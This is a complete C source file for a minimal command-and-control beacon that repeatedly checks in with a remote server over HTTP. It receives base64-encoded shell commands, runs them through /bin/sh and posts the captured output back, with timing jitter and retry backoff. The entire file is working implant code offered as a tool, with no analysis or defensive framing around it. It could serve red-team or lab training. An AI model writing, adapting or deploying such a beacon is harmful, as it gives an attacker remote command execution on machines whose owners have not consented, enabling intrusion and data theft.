/*
 * beacon.c — minimal C2 beacon (C11, POSIX)
 *
 * Build:  cc -std=c11 -D_POSIX_C_SOURCE=200809L -Wall -Wextra -o beacon beacon.c
 * Run:    ./beacon [server_host [server_port]]
 *
 * Protocol (HTTP/1.1 POST /checkin, JSON body):
 *   Beacon → server:
 *     { "host_id":"<id>", "task_id":"<id or empty>",
 *       "stdout":"<b64>", "stderr":"<b64>", "exit_code":<int> }
 *
 *   Server → beacon:
 *     { "task_id":"<id>", "type":"exec|sleep|exit", "data":"<b64>" }
 *     { "type":"none" }
 *
 *   "data" for exec  — base64 of shell command string
 *   "data" for sleep — base64 of decimal seconds string (e.g. "30")
 *   "data" for exit  — omitted / ignored
 */

#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netdb.h>
#include <arpa/inet.h>

/* ── tunables ───────────────────────────────────────────────────────────── */
#define DEFAULT_HOST    "127.0.0.1"
#define DEFAULT_PORT    "8080"
#define CHECKIN_PATH    "/checkin"
#define SLEEP_BASE      10          /* base interval between checkins (s)    */
#define JITTER_MAX      5           /* additional random jitter (s)          */
#define BACKOFF_INIT    5           /* initial retry backoff (s)             */
#define BACKOFF_MAX     300         /* ceiling for exponential backoff (s)   */
#define BACKOFF_MULT    2           /* backoff multiplier per failure        */
#define BUF_LARGE       (1 << 16)  /* 64 KiB — HTTP response buffer         */
#define BUF_CMD         (1 << 15)  /* 32 KiB — stdout / stderr per stream   */
#define BUF_SMALL       1024        /* misc small buffers                    */

/* ── base64 ─────────────────────────────────────────────────────────────── */

static const char B64_ENC[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/* Returns bytes written (NUL-terminated), 0 on overflow. */
static size_t b64_encode(const unsigned char *src, size_t srclen,
                         char *dst, size_t dstmax)
{
    size_t out = 0;
    for (size_t i = 0; i < srclen; ) {
        unsigned int b0 = src[i++];
        unsigned int b1 = i < srclen ? src[i++] : 0;
        unsigned int b2 = i < srclen ? src[i++] : 0;
        if (out + 4 >= dstmax) return 0;
        dst[out++] = B64_ENC[b0 >> 2];
        dst[out++] = B64_ENC[((b0 & 3) << 4) | (b1 >> 4)];
        dst[out++] = (srclen > i - 2) ? B64_ENC[((b1 & 0xf) << 2) | (b2 >> 6)] : '=';
        dst[out++] = (srclen > i - 1) ? B64_ENC[b2 & 0x3f] : '=';
    }
    dst[out] = '\0';
    return out;
}

static int b64_val(char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

/* Returns decoded byte count, -1 on error.  dst receives NUL terminator. */
static ssize_t b64_decode(const char *src, unsigned char *dst, size_t dstmax)
{
    size_t out = 0;
    for (size_t i = 0; src[i] && src[i] != '='; ) {
        int v0 = b64_val(src[i++]); if (v0 < 0) return -1;
        int v1 = b64_val(src[i++]); if (v1 < 0) return -1;
        if (out + 1 >= dstmax) return -1;
        dst[out++] = (unsigned char)((v0 << 2) | (v1 >> 4));
        if (!src[i] || src[i] == '=') break;
        int v2 = b64_val(src[i++]); if (v2 < 0) return -1;
        if (out + 1 >= dstmax) return -1;
        dst[out++] = (unsigned char)(((v1 & 0xf) << 4) | (v2 >> 2));
        if (!src[i] || src[i] == '=') break;
        int v3 = b64_val(src[i++]); if (v3 < 0) return -1;
        if (out + 1 >= dstmax) return -1;
        dst[out++] = (unsigned char)(((v2 & 3) << 6) | v3);
    }
    dst[out] = '\0';
    return (ssize_t)out;
}

/* ── minimal JSON helpers (strstr-based, no full parser) ────────────────── */

/*
 * Extract the string value for "key" from a flat JSON object.
 * Writes the unescaped value into out (NUL-terminated).
 * Returns 1 on success, 0 if not found.
 */
static int json_str(const char *json, const char *key,
                    char *out, size_t outmax)
{
    char needle[BUF_SMALL];
    snprintf(needle, sizeof(needle), "\"%s\"", key);
    const char *p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    while (*p == ' ' || *p == '\t' || *p == ':' || *p == ' ') p++;
    if (*p != '"') return 0;
    p++;
    size_t i = 0;
    while (*p && *p != '"' && i + 1 < outmax) {
        if (*p == '\\' && *(p+1)) { p++; }  /* skip escape prefix */
        out[i++] = *p++;
    }
    out[i] = '\0';
    return 1;
}

/* ── exec with separate stdout / stderr capture ─────────────────────────── */

/*
 * Fork a shell, execute cmd, capture stdout and stderr into separate
 * dynamically-allocated buffers (caller frees), return exit status.
 * Returns -1 on fork/pipe error.
 */
static int exec_command(const char *cmd,
                        char **out_stdout, size_t *out_stdout_len,
                        char **out_stderr, size_t *out_stderr_len)
{
    int pfd_out[2], pfd_err[2];
    if (pipe(pfd_out) < 0 || pipe(pfd_err) < 0) return -1;

    pid_t pid = fork();
    if (pid < 0) return -1;

    if (pid == 0) {
        /* child */
        close(pfd_out[0]); close(pfd_err[0]);
        dup2(pfd_out[1], STDOUT_FILENO);
        dup2(pfd_err[1], STDERR_FILENO);
        close(pfd_out[1]); close(pfd_err[1]);
        execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
        _exit(127);
    }

    /* parent — close write ends */
    close(pfd_out[1]); close(pfd_err[1]);

    *out_stdout = malloc(BUF_CMD);
    *out_stderr = malloc(BUF_CMD);
    if (!*out_stdout || !*out_stderr) {
        free(*out_stdout); free(*out_stderr);
        close(pfd_out[0]); close(pfd_err[0]);
        return -1;
    }

    *out_stdout_len = 0;
    *out_stderr_len = 0;

    /* read both pipes until both are drained */
    int open_pipes = 2;
    while (open_pipes) {
        fd_set rd;
        FD_ZERO(&rd);
        int maxfd = -1;
        if (pfd_out[0] >= 0) { FD_SET(pfd_out[0], &rd); if (pfd_out[0] > maxfd) maxfd = pfd_out[0]; }
        if (pfd_err[0] >= 0) { FD_SET(pfd_err[0], &rd); if (pfd_err[0] > maxfd) maxfd = pfd_err[0]; }
        if (maxfd < 0) break;

        struct timeval tv = { .tv_sec = 30, .tv_usec = 0 };
        if (select(maxfd + 1, &rd, NULL, NULL, &tv) <= 0) break;

        for (int i = 0; i < 2; i++) {
            int fd   = (i == 0) ? pfd_out[0] : pfd_err[0];
            char **buf = (i == 0) ? out_stdout : out_stderr;
            size_t *len = (i == 0) ? out_stdout_len : out_stderr_len;
            if (fd < 0 || !FD_ISSET(fd, &rd)) continue;

            ssize_t n = read(fd, *buf + *len, BUF_CMD - *len - 1);
            if (n <= 0) {
                close(fd);
                if (i == 0) pfd_out[0] = -1; else pfd_err[0] = -1;
                open_pipes--;
            } else {
                *len += (size_t)n;
            }
        }
    }

    if (pfd_out[0] >= 0) close(pfd_out[0]);
    if (pfd_err[0] >= 0) close(pfd_err[0]);

    (*out_stdout)[*out_stdout_len] = '\0';
    (*out_stderr)[*out_stderr_len] = '\0';

    int status = 0;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

/* ── minimal HTTP POST over a plain TCP socket ──────────────────────────── */

/*
 * Open a TCP connection to host:port, send an HTTP/1.1 POST to path with
 * body, write the response body into resp_buf (NUL-terminated).
 * Returns HTTP status code, or -1 on network/parse error.
 */
static int http_post(const char *host, const char *port,
                     const char *path, const char *body,
                     char *resp_buf, size_t resp_max)
{
    struct addrinfo hints = { .ai_family   = AF_UNSPEC,
                              .ai_socktype = SOCK_STREAM };
    struct addrinfo *res = NULL;
    if (getaddrinfo(host, port, &hints, &res) != 0 || !res) return -1;

    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) { freeaddrinfo(res); return -1; }

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        freeaddrinfo(res); close(fd); return -1;
    }
    freeaddrinfo(res);

    /* build and send request */
    size_t bodylen = strlen(body);
    char req[BUF_LARGE];
    int reqlen = snprintf(req, sizeof(req),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%s\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        path, host, port, bodylen, body);
    if (reqlen <= 0 || (size_t)reqlen >= sizeof(req)) { close(fd); return -1; }

    ssize_t sent = 0, total = reqlen;
    while (sent < total) {
        ssize_t n = send(fd, req + sent, (size_t)(total - sent), 0);
        if (n <= 0) { close(fd); return -1; }
        sent += n;
    }

    /* read full response */
    char raw[BUF_LARGE];
    size_t rawlen = 0;
    ssize_t n;
    while ((n = recv(fd, raw + rawlen, sizeof(raw) - rawlen - 1, 0)) > 0)
        rawlen += (size_t)n;
    raw[rawlen] = '\0';
    close(fd);

    /* parse status code */
    int status = 0;
    if (sscanf(raw, "HTTP/1.%*d %d", &status) != 1) return -1;

    /* locate body after \r\n\r\n */
    const char *body_start = strstr(raw, "\r\n\r\n");
    if (!body_start) return status;
    body_start += 4;

    size_t blen = strlen(body_start);
    if (blen >= resp_max) blen = resp_max - 1;
    memcpy(resp_buf, body_start, blen);
    resp_buf[blen] = '\0';

    return status;
}

/* ── identity ───────────────────────────────────────────────────────────── */

static void get_host_id(char *buf, size_t max)
{
    char hostname[256] = "unknown";
    gethostname(hostname, sizeof(hostname) - 1);

    /* append a short random suffix derived from pid + time */
    srand((unsigned)(time(NULL) ^ (unsigned long)getpid()));
    snprintf(buf, max, "%s-%04x", hostname, (unsigned)(rand() & 0xffff));
}

/* ── checkin ────────────────────────────────────────────────────────────── */

typedef struct {
    char type[32];
    char task_id[64];
    char data[BUF_SMALL];   /* base64-encoded task payload */
} Task;

/*
 * Send one checkin to the server.
 * prev_task_id: task id we're reporting a result for (empty string if none)
 * result_* fields: stdout/stderr/exit code from the previous task
 * On success, fills *task and returns HTTP status; returns -1 on error.
 */
static int do_checkin(const char *server_host, const char *server_port,
                      const char *host_id,
                      const char *prev_task_id,
                      const char *result_stdout_b64,
                      const char *result_stderr_b64,
                      int result_exit_code,
                      Task *task)
{
    char body[BUF_LARGE];
    snprintf(body, sizeof(body),
        "{\"host_id\":\"%s\","
        "\"task_id\":\"%s\","
        "\"stdout\":\"%s\","
        "\"stderr\":\"%s\","
        "\"exit_code\":%d}",
        host_id,
        prev_task_id,
        result_stdout_b64,
        result_stderr_b64,
        result_exit_code);

    char resp[BUF_LARGE];
    int status = http_post(server_host, server_port,
                           CHECKIN_PATH, body, resp, sizeof(resp));
    if (status != 200) return status;

    memset(task, 0, sizeof(*task));
    json_str(resp, "type",    task->type,    sizeof(task->type));
    json_str(resp, "task_id", task->task_id, sizeof(task->task_id));
    json_str(resp, "data",    task->data,    sizeof(task->data));

    return status;
}

/* ── main ───────────────────────────────────────────────────────────────── */

int main(int argc, char *argv[])
{
    const char *server_host = (argc > 1) ? argv[1] : DEFAULT_HOST;
    const char *server_port = (argc > 2) ? argv[2] : DEFAULT_PORT;

    char host_id[BUF_SMALL];
    get_host_id(host_id, sizeof(host_id));

    /* result state from last executed task */
    char last_task_id[64]      = "";
    char last_stdout_b64[BUF_LARGE] = "";
    char last_stderr_b64[BUF_LARGE] = "";
    int  last_exit_code        = 0;
    int  has_result            = 0;

    unsigned backoff = BACKOFF_INIT;

    fprintf(stderr, "[beacon] host_id=%s  server=%s:%s\n",
            host_id, server_host, server_port);

    while (1) {
        Task task;
        int status = do_checkin(server_host, server_port,
                                host_id,
                                has_result ? last_task_id    : "",
                                has_result ? last_stdout_b64 : "",
                                has_result ? last_stderr_b64 : "",
                                has_result ? last_exit_code  : 0,
                                &task);

        /* clear result after sending */
        has_result = 0;
        last_task_id[0] = '\0';
        last_stdout_b64[0] = '\0';
        last_stderr_b64[0] = '\0';
        last_exit_code = 0;

        if (status < 0 || status != 200) {
            fprintf(stderr, "[beacon] checkin failed (status=%d), backing off %us\n",
                    status, backoff);
            sleep(backoff);
            backoff = backoff * BACKOFF_MULT;
            if (backoff > BACKOFF_MAX) backoff = BACKOFF_MAX;
            continue;
        }
        backoff = BACKOFF_INIT;   /* reset on success */

        fprintf(stderr, "[beacon] task type=%s id=%s\n",
                task.type[0] ? task.type : "(none)", task.task_id);

        if (strcmp(task.type, "exec") == 0) {
            /* decode command */
            unsigned char cmd_buf[BUF_SMALL];
            ssize_t cmd_len = b64_decode(task.data, cmd_buf, sizeof(cmd_buf));
            if (cmd_len <= 0) {
                fprintf(stderr, "[beacon] bad base64 in exec task\n");
                goto sleep_and_loop;
            }
            const char *cmd = (const char *)cmd_buf;
            fprintf(stderr, "[beacon] exec: %s\n", cmd);

            char *out_stdout = NULL, *out_stderr = NULL;
            size_t out_slen = 0, out_elen = 0;
            int exit_code = exec_command(cmd,
                                         &out_stdout, &out_slen,
                                         &out_stderr, &out_elen);

            /* base64-encode outputs for transport */
            b64_encode((unsigned char *)out_stdout, out_slen,
                       last_stdout_b64, sizeof(last_stdout_b64));
            b64_encode((unsigned char *)out_stderr, out_elen,
                       last_stderr_b64, sizeof(last_stderr_b64));
            last_exit_code = exit_code;
            strncpy(last_task_id, task.task_id, sizeof(last_task_id) - 1);
            has_result = 1;

            free(out_stdout);
            free(out_stderr);

        } else if (strcmp(task.type, "sleep") == 0) {
            unsigned char sec_str[64];
            ssize_t n = b64_decode(task.data, sec_str, sizeof(sec_str));
            if (n > 0) {
                unsigned secs = (unsigned)atoi((const char *)sec_str);
                fprintf(stderr, "[beacon] sleeping %u seconds\n", secs);
                sleep(secs);
            }

        } else if (strcmp(task.type, "exit") == 0) {
            fprintf(stderr, "[beacon] received exit, shutting down\n");
            return 0;

        } else if (strcmp(task.type, "none") == 0 || task.type[0] == '\0') {
            /* nothing queued */
        } else {
            fprintf(stderr, "[beacon] unknown task type: %s\n", task.type);
        }

sleep_and_loop:;
        /* sleep with jitter */
        srand((unsigned)(time(NULL) ^ (unsigned long)getpid()));
        unsigned jitter = (unsigned)(rand() % (JITTER_MAX + 1));
        sleep(SLEEP_BASE + jitter);
    }
}
